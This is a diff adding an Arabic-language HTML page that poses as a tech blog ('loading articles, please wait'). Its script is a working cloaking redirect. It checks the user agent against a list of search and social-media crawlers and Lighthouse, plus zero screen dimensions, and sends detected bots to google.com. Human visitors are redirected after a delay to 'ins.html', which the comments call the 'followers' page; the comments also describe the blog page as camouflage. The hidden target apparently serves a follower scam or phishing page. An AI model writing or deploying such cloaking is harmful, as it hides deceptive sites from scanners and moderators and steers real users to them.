@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title> مدونة التقنية </title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px; color: #444; }
+        .content { max-width: 600px; margin: auto; }
+    </style>
+</head>
+<body>
+
+    <div class="content" id="main-content">
+        <h1>مرحباً بكم في مدونتنا</h1>
+        <p>جاري تحميل المقالات التقنية، يرجى الانتظار ثانية...</p>
+    </div>
+
+    <script>
+        function checkVisitor() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            
+            // قائمة ببعض الكلمات التي تدل على أن الزائر هو روبوت فحص
+            const bots = [
+                "googlebot", "bingbot", "yandexbot", "duckduckbot", 
+                "slurp", "baiduspider", "facebookexternalhit", "twitterbot", "lighthouse"
+            ];
+
+            // فحص هل الـ User-Agent يحتوي على أي كلمة من القائمة
+            const isBot = bots.some(bot => userAgent.includes(bot));
+
+            // فحص إضافي: الروبوتات غالباً لا تملك دقة شاشة حقيقية أو تكون دقتها صغيرة جداً
+            const isSuspicious = (screen.width === 0 || screen.height === 0);
+
+            if (isBot || isSuspicious) {
+                // إذا كان روبوت، نتركه في الصفحة أو نوجهه لجوجل
+                console.log("الزائر روبوت - البقاء في الصفحة التمويهية");
+                window.location.href = "https://www.google.com"; 
+            } else {
+                // إذا كان شخص حقيقي، نوجهه لصفحة "المتابعين" بعد تأخير بسيط للتمويه
+                setTimeout(() => {
+                    window.location.href = "ins.html";
+                }, 1000);
+            }
+        }
+
+        // تشغيل الفحص فور تحميل الصفحة
+        window.onload = checkVisitor;
+    </script>
+</body>
+</html>
